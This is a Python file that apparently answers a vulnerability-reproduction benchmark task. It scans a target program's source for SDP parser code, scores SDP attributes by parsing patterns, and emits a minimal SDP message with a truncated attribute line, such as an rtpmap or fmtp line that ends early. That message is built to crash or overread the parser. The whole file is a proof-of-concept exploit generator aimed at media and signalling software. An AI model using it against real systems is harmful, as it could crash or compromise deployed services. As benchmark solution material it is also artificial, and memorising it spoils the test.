import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_text_files_from_dir(self, root: str) -> Iterable[Tuple[str, str]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".m", ".mm"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    yield (path, data.decode("utf-8", errors="ignore"))
                except OSError:
                    continue

    def _iter_text_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, str]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".m", ".mm"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield (name, data.decode("utf-8", errors="ignore"))
        except Exception:
            return

    def _collect_relevant_sources(self, src_path: str) -> List[Tuple[str, str]]:
        texts: List[Tuple[str, str]] = []
        it: Iterable[Tuple[str, str]]
        if os.path.isdir(src_path):
            it = self._iter_text_files_from_dir(src_path)
        else:
            it = self._iter_text_files_from_tar(src_path)

        for path, text in it:
            pl = path.lower().replace("\\", "/")
            if "sdp" not in pl:
                continue
            if "parser" not in pl and "/sdp/" not in pl and "sdp_parser" not in pl:
                continue
            if len(text) < 32:
                continue
            texts.append((pl, text))
            if len(texts) >= 200:
                break
        return texts

    def _score_attr(self, attr: str, sources: List[Tuple[str, str]]) -> float:
        score = 0.0
        attr_l = attr.lower()
        delim_map = {
            "rtpmap": "/",
            "fmtp": "=",
            "ssrc": ":",
            "extmap": "/",
            "rid": "=",
            "simulcast": ";",
            "fingerprint": " ",
            "crypto": ":",
            "candidate": " ",
            "rtcp-fb": " ",
        }
        delim = delim_map.get(attr_l, None)

        while_ptr_pat = re.compile(r"\bwhile\s*\(\s*\*[A-Za-z_]\w*")
        strchr_pat = re.compile(r"\bstrchr\s*\(")
        memchr_pat = re.compile(r"\bmemchr\s*\(")
        find_pat = re.compile(r"\.find\s*\(")

        for path, text in sources:
            tl = text.lower()
            if attr_l not in tl:
                continue
            local = 0.0
            local += 10.0
            if "core/parser/sdp" in path or "/parser/sdp" in path or "parser/sdp" in path:
                local += 8.0
            if "fuzz" in path or "fuzzer" in path:
                local += 2.0
            if while_ptr_pat.search(text) is not None:
                local += 2.5
            if strchr_pat.search(text) is not None:
                local += 1.0
            if memchr_pat.search(text) is not None:
                local += 0.5
            if find_pat.search(text) is not None:
                local += 0.5
            if delim is not None and delim in text:
                local += 1.5
            score += local
        return score

    def _choose_trigger(self, sources: List[Tuple[str, str]]) -> str:
        candidates = ["rtpmap", "fmtp", "ssrc", "rid", "extmap", "simulcast", "fingerprint", "crypto", "candidate", "rtcp-fb"]
        scores: Dict[str, float] = {}
        for a in candidates:
            scores[a] = self._score_attr(a, sources)
        best = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores.get(best, 0.0) <= 0.0:
            return "rtpmap"
        return best

    def _build_poc(self, trigger: str) -> bytes:
        # Minimal SDP scaffold; chosen to reach attribute parsing in most SDP parsers.
        header = (
            "v=0\r\n"
            "o=- 0 0 IN IP4 127.0.0.1\r\n"
            "s=-\r\n"
            "c=IN IP4 0.0.0.0\r\n"
            "t=0 0\r\n"
            "m=audio 9 RTP/AVP 111\r\n"
        )

        if trigger == "rtpmap":
            body = "a=rtpmap:111 opus/\r\n"
        elif trigger == "fmtp":
            body = "a=rtpmap:111 opus/48000/2\r\n" "a=fmtp:111 x=\r\n"
        elif trigger == "ssrc":
            body = "a=rtpmap:111 opus/48000/2\r\n" "a=ssrc:1 cname:\r\n"
        elif trigger == "rid":
            body = "a=rid:1 send max-width=\r\n"
        elif trigger == "extmap":
            body = "a=extmap:1/recvonly\r\n"
        elif trigger == "simulcast":
            body = "a=simulcast:send \r\n"
        elif trigger == "fingerprint":
            body = "a=fingerprint:sha-256 \r\n"
        elif trigger == "crypto":
            body = "a=crypto:1 AES_CM_128_HMAC_SHA1_80 inline:\r\n"
        elif trigger == "candidate":
            body = "a=candidate:1 1 UDP 1 1.1.1.1 1 typ\r\n"
        elif trigger == "rtcp-fb":
            body = "a=rtcp-fb:111 \r\n"
        else:
            body = "a=rtpmap:111 opus/\r\n"

        return (header + body).encode("ascii", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        sources = self._collect_relevant_sources(src_path)
        trigger = self._choose_trigger(sources)
        return self._build_poc(trigger)